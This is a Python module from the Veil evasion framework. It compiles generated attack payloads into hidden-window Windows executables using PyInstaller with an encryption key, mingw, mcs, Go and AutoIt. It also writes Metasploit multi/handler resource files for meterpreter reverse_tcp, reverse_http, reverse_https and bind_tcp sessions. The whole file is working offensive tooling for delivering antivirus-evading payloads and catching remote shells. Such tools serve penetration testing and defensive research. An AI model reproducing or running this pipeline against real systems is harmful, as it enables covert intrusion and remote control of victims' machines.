"""
This file helps "compilation" of source code
"""

import hashlib
import os
import sys
from tools.evasion.evasion_common import evasion_helpers
from lib.common import helpers


# Try to find and import the settings.py config file
try:
    sys.path.append("/etc/veil/")
    import settings
except ImportError:
    print( "\n [!] ERROR #1-5: Can't import /etc/veil/settings.py.   Run: %s\n" % ( os.path.abspath( "./config/update-config.py" ) ) )
    sys.exit()


def compiler(payload_object, invoked=False, cli_object=None):
    # Check the source code to ensure it is present
    if payload_object.payload_source_code == '':
        print(helpers.color("\n [!] ERROR: No payload source code provided.\n", warning=True))
        return False
    else:
        # print title bar
        evasion_helpers.title_screen()

        if not invoked:
            # Determine the file name to use for output
            file_name = input(' [>] Please enter the base name for output files (default is payload): ').strip()
        else:
            file_name = cli_object.o

        # Basic checks on input
        while file_name != '' and ("\\" in file_name or "/" in file_name):
            print(helpers.color("\nPlease provide a base name, not a path, for the output base\n", warning=True))
            file_name = input(' [>] Please enter the base name for output files (default is payload): ').strip()

        # If no base name, set it to be payload
        if file_name == '':
            file_name = 'payload'

        # run check to make sure file doesn't exist, if it does
        # provide a new filename
        file_name = find_file_name(file_name, payload_object)
        source_code_filepath = settings.PAYLOAD_SOURCE_PATH + file_name + "." + payload_object.extension
        # Used when outputting exe files, go figure
        executable_filepath = settings.PAYLOAD_COMPILED_PATH + file_name + ".exe"

        if payload_object.language is not "native" and payload_object.extension is not "war":
            with open(source_code_filepath, 'w') as source_file:
                source_file.write(payload_object.payload_source_code)

        if payload_object.language == 'python':
            if not invoked:
                compile_method = ""
            else:
                compile_method = cli_object.compiler
            # Check extension for war or normal python file
            if payload_object.extension == 'py':
                if settings.OPERATING_SYSTEM == "Windows":
                    compile_method = 'py2exe'
                else:
                    if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y' and not invoked:
                        evasion_helpers.title_screen()
                        # if we have a linux distro, continue...
                        # Determine if the user wants PyInstaller, Pwnstaller, or Py2Exe.
                        print(' [?] How would you like to create your payload executable?\n')
                        print('     %s - PyInstaller %s' % (helpers.color('1'), helpers.color('(default)', yellow=True)))
                        print('     %s - Py2Exe\n' % (helpers.color('2')))

                        user_compile_choice = input(" [>] Please enter the number of your choice: ")
                        if user_compile_choice == "1" or user_compile_choice == '':
                            compile_method = "pyinstaller"
                        elif user_compile_choice == "2":
                            compile_method = "py2exe"
                        else:
                            compile_method = "pyinstaller"

                if compile_method == 'py2exe' and payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                    # Generate setup.py File for Py2Exe
                    with open(settings.PAYLOAD_SOURCE_PATH + '/setup.py', 'w') as setup_file:
                        setup_file.write("from distutils.core import setup\n")
                        setup_file.write("import py2exe, sys, os\n\n")
                        setup_file.write("setup(\n")
                        setup_file.write("\toptions = {'py2exe': {'bundle_files': 1}},\n")
                        setup_file.write("\tzipfile = None,\n")
                        setup_file.write("\twindows=['" + file_name + ".py']\n")
                        setup_file.write(")")

                    # Generate Batch script for Compiling on Windows Using Py2Exe
                    with open(settings.PAYLOAD_SOURCE_PATH + '/runme.bat', 'w') as runme_file:
                        runme_file.write('rem Batch Script for compiling python code into an executable\n')
                        runme_file.write('rem on windows with py2exe\n')
                        runme_file.write('rem Usage: Drop into your Python folder and click, or anywhere if Python is in your system path\n\n')
                        runme_file.write("python setup.py py2exe\n")
                        runme_file.write('cd dist\n')
                        runme_file.write('move ' + file_name + '.exe ../\n')
                        runme_file.write('cd ..\n')
                        runme_file.write('rmdir /S /Q build\n')
                        runme_file.write('rmdir /S /Q dist\n')

                    evasion_helpers.title_screen()
                    print_payload_information(payload_object)
                    print(helpers.color("\npy2exe files 'setup.py' and 'runme.bat' written to:\n" + settings.PAYLOAD_SOURCE_PATH + "\n"))

                else:
                    if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                        # Used for PyInstaller standard
                        # copy the pyinstaller runw to maintain its integrity in the event
                        # pwnstaller is added in for python3 - this will future proof it
                        runw_path = settings.VEIL_PATH + '/tools/evasion/evasion_common/tools/runw.orig.exe'
                        os.system('cp ' + runw_path + ' ' + settings.PYINSTALLER_PATH + 'PyInstaller/bootloader/Windows-32bit/runw.exe')

                        # Validate python is installed in wine
                        if not os.path.isfile(settings.WINEPREFIX + 'drive_c/Python34/python.exe'):
                            print(helpers.color("\n [!] ERROR: Can't find python.exe in " + os.path.expanduser(settings.WINEPREFIX + 'drive_c/Python34/'), warning=True))
                            print(helpers.color(" [!] ERROR: Make sure the python.exe binary exists before using PyInstaller.", warning=True))
                            sys.exit(1)

                        random_key = evasion_helpers.randomString()
                        os.system('WINEPREFIX=' + settings.WINEPREFIX + ' wine ' + settings.WINEPREFIX + '/drive_c/Python34/python.exe' + ' ' + os.path.expanduser(settings.PYINSTALLER_PATH + '/pyinstaller.py') + ' --onefile --noconsole --key ' + random_key + ' ' + source_code_filepath)

                        evasion_helpers.title_screen()

                        if os.path.isfile('dist/' + file_name + ".exe"):
                            os.system('mv dist/' + file_name + ".exe " + settings.PAYLOAD_COMPILED_PATH)
                            hash_executable(executable_filepath, file_name)
                            print_payload_information(payload_object)
                            print(" [*] Executable written to: " + helpers.color(settings.PAYLOAD_COMPILED_PATH + file_name + ".exe"))
                        else:
                            print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))

                        os.system('rm -rf dist')
                        os.system('rm -rf build')
                        os.system('rm -f *.spec')
                        os.system('rm -f logdict*.*')
                    print(" [*] Source code written to: " + helpers.color(source_code_filepath))

            elif payload_object.extension == 'war':
                path_here = settings.PAYLOAD_COMPILED_PATH + file_name + "." + payload_object.extension
                with open(path_here, 'wb') as source_file:
                    source_file.write(payload_object.payload_source_code)
                # Ensure that war file was written to disk
                if os.path.isfile(path_here):
                    hash_executable(path_here, file_name)
                    print_payload_information(payload_object)
                    print(" [*] WAR file written to: " + helpers.color(source_code_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create WAR file.", warning=True))

            else:
                print(helpers.color(" [!] ERROR: Invalid python extension in payload module.\n", warning=True))

        elif payload_object.language == 'ruby':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                os.system('WINEPREFIX=' + settings.WINEPREFIX + ' wine ' + settings.WINEPREFIX + '/drive_c/Ruby187/bin/ruby.exe ' + settings.WINEPREFIX + '/drive_c/Ruby187/bin/ocra --windows '+ source_code_filepath + ' --output ' + executable_filepath + ' ' + settings.WINEPREFIX + '/drive_c/Ruby187/lib/ruby/gems/1.8/gems/win32-api-1.4.8-x86-mingw32/lib/win32/*')

                evasion_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'powershell':
            evasion_helpers.title_screen()
            print_payload_information(payload_object)
            print(" [*] PowerShell doesn't compile, so you just get text :)")
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'perl':
            print_payload_information(payload_object)
            print("\nPerl can't currently be compiled in Linux. Install on Windows:")
            print("https://www.veil-framework.com/perl-of-no-hope-january-v-day-2016/")
            print("Command: pp -gui -o <executablename> <sourcecodefile.pl>")
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'native':
            # set path for native payload executable output
            path_here = settings.PAYLOAD_COMPILED_PATH + file_name + "." + payload_object.extension
            with open(path_here, 'wb') as source_file:
                source_file.write(payload_object.payload_source_code)
            # Ensure executables was written to disk
            if os.path.isfile(path_here):
                hash_executable(path_here, file_name)
                print_payload_information(payload_object)
                print(" [*] Executable written to: " + helpers.color(path_here))
            else:
                print(helpers.color(" [!] ERROR: Unable to create Exe file.", warning=True))

        elif payload_object.language == 'lua':
            print_payload_information(payload_object)
            print(" [*] Lua currently doesn't compile in linux, so you just get text :)")
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'go':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile go payload
                os.system( 'env GOROOT={0} GOOS=windows GOARCH=386 {0}/bin/go build -ldflags "-s -w -H=windowsgui" -v -o {1} {2}'.format(settings.GOLANG_PATH, executable_filepath, source_code_filepath) )

                evasion_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'cs':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile our CS code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('mcs -platform:x86 -target:winexe ' + source_code_filepath + ' -out:' + executable_filepath)

                evasion_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'c':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile our C code into an executable and pass a compiler flag to prevent it from opening a command prompt when run
                os.system('i686-w64-mingw32-gcc -Wl,-subsystem,windows ' + source_code_filepath + ' -o ' + executable_filepath + " -lwsock32")

                evasion_helpers.title_screen()

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        elif payload_object.language == 'autoit':
            if payload_object.required_options['COMPILE_TO_EXE'][0].lower() == 'y':
                # Compile autoit code
                os.system('WINEPREFIX=' + settings.WINEPREFIX + ' wine ' + settings.WINEPREFIX + 'drive_c/Program\ Files/AutoIt3/Aut2Exe/Aut2exe.exe /in ' + source_code_filepath + ' /out ' + executable_filepath + ' /comp 2 /nopack')

                if os.path.isfile(executable_filepath):
                    hash_executable(executable_filepath, file_name)
                    print_payload_information(payload_object)
                    print(" [*] Executable written to: " + helpers.color(executable_filepath))
                else:
                    print(helpers.color(" [!] ERROR: Unable to create output file.", warning=True))
            print(" [*] Source code written to: " + helpers.color(source_code_filepath))

        else:
            print(helpers.color("\n [!] ERROR: Invalid payload language in payload module.\n", warning=True))
            return False

        if invoked:
            handler_code_generator(payload_object, file_name, invoked=True, cli_obj=cli_object)
        else:
            handler_code_generator(payload_object, file_name)

        if os.path.isfile(settings.HANDLER_PATH + file_name + '.rc'):
            print(" [*] Metasploit Resource file written to: " + helpers.color(settings.HANDLER_PATH + file_name + '.rc'))

        if not invoked:
            dummy = input('\nHit enter to continue...\n')

    # End of if statement checking to make sure payload_source_code is
    # not empty

    return True


def find_file_name(payload_name, selected_payload_object):
    # Assume file exists until we can verify it doesn't
    filename_exists = True
    counter = 0
    first_time = True
    while filename_exists:
        if first_time:
            if not os.path.isfile(settings.PAYLOAD_SOURCE_PATH + payload_name + "." + selected_payload_object.extension) and not os.path.isfile(settings.PAYLOAD_COMPILED_PATH + payload_name + "." + selected_payload_object.extension):
                filename_exists = False
            else:
                counter += 1
                first_time = False
        else:
            if not os.path.isfile(settings.PAYLOAD_SOURCE_PATH + payload_name + str(counter) + "." + selected_payload_object.extension) and not os.path.isfile(settings.PAYLOAD_COMPILED_PATH + payload_name + str(counter) + "." + selected_payload_object.extension):
                filename_exists = False
            else:
                counter += 1
    if first_time:
        return payload_name
    else:
        return payload_name + str(counter)


def handler_code_generator(selected_payobject, handler_name, invoked=False, cli_obj=None):
    lhost_value = ""
    lport_value = ""
    rhost_value = ""
    payload_used = ""
    skip_handler = False

    if selected_payobject.language != "native" and selected_payobject.extension != "war":
        if 'shellcode_inject' in selected_payobject.path:
            # Parse the object to generate the payload
            if type(selected_payobject.shellcode.shellcode_options) is dict or invoked:
                if selected_payobject.payload_type == 'rev_tcp':
                    payload_used = 'windows/meterpreter/reverse_tcp'
                elif selected_payobject.payload_type == 'rev_http':
                    payload_used = 'windows/meterpreter/reverse_http'
                elif selected_payobject.payload_type == 'rev_https':
                    payload_used = 'windows/meterpreter/reverse_https'
                elif selected_payobject.payload_type == 'rev_tcp_dns':
                    payload_used = 'windows/meterpreter/reverse_tcp_dns'
                elif selected_payobject.payload_type == 'rev_tcp_all_ports':
                    payload_used = 'windows/meterpreter/reverse_tcp_allports'
                elif selected_payobject.payload_type == 'bind_tcp':
                    payload_used = 'windows/meterpreter/bind_tcp'

                if invoked:
                    if cli_obj.ordnance_payload is not None and cli_obj.ordnance_payload.lower() == 'bind_tcp':
                        rhost_value = cli_obj.ip
                    else:
                        lhost_value = cli_obj.ip
                    lport_value = str(cli_obj.port)
                else:
                    if 'LHOST' in selected_payobject.shellcode.shellcode_options:
                        lhost_value = selected_payobject.shellcode.shellcode_options['LHOST']
                    if 'LPORT' in selected_payobject.shellcode.shellcode_options:
                        lport_value = selected_payobject.shellcode.shellcode_options['LPORT']
                    if 'RHOST' in selected_payobject.shellcode.shellcode_options:
                        rhost_value = selected_payobject.shellcode.shellcode_options['RHOST']

            else:
                # parse msfvenom command
                payload_used = selected_payobject.payload_type

                split_msf_command = selected_payobject.shellcode.shellcode_options.split()
                for option in split_msf_command:
                    if 'LHOST' in option:
                        lhost_value = option.split('=')[1]
                    elif 'LPORT' in option:
                        lport_value = option.split('=')[1]
                    elif 'RHOST' in option:
                        rhost_value = option.split('=')[1]

        elif 'meterpreter' in selected_payobject.path:
            # Determine payload type
            if 'bind_tcp' in selected_payobject.path:
                payload_used = 'windows/meterpreter/bind_tcp'
            elif 'rev_tcp' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_tcp'
            elif 'rev_https' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_https'
            elif 'rev_http' in selected_payobject.path:
                payload_used = 'windows/meterpreter/reverse_http'

            # Grab LHOST or RHOST and LPORT values
            if 'LHOST' in selected_payobject.required_options:
                lhost_value = selected_payobject.required_options['LHOST'][0]
            if 'RHOST' in selected_payobject.required_options:
                rhost_value = selected_payobject.required_options['RHOST'][0]
            if 'LPORT' in selected_payobject.required_options:
                lport_value = selected_payobject.required_options['LPORT'][0]

        # Generate the handler file
        handler_text = 'use exploit/multi/handler\n'
        handler_text += 'set PAYLOAD ' + payload_used + '\n'
        if lhost_value:
            handler_text += 'set LHOST ' + lhost_value + '\n'
        elif rhost_value:
            handler_text += 'set RHOST ' + rhost_value + '\n'
        else:
            skip_handler = True
        handler_text += 'set LPORT ' + str(lport_value) + '\n'
        handler_text += 'set ExitOnSession false\n'
        handler_text += 'exploit -j\n'

        # Check to see if there is something there already
        try:
            os.remove(settings.HANDLER_PATH + handler_name + '.rc')
        except OSError:
            pass

        if not skip_handler:
            with open(settings.HANDLER_PATH + handler_name + '.rc', 'w') as handler_out:
                handler_out.write(handler_text)
        else:
            print(helpers.color("\nNo LHOST/RHOST value. Not going to create an .rc file\n", warning=True))
    else:
        # we do nothing since no handler file is made for native payloads
        pass
    return


def hash_executable(exe_path, file_name):
    # Read executable, hash it, and store in file
    with open(exe_path, 'rb') as get_hash:
        exe_contents = get_hash.read()

    sha1_hasher = hashlib.sha1()
    sha1_hasher.update(exe_contents)
    sha1_hash = sha1_hasher.hexdigest()

    # Write hashed value to file
    with open(settings.HASH_LIST, 'a') as hash_file:
        hash_file.write(sha1_hash + ":" + file_name + "\n")

    return


def print_payload_information(pay_object):
    print(' [*] Language: ' + helpers.color(pay_object.language))
    print(' [*] Payload Module: ' + helpers.color(pay_object.path))
    return
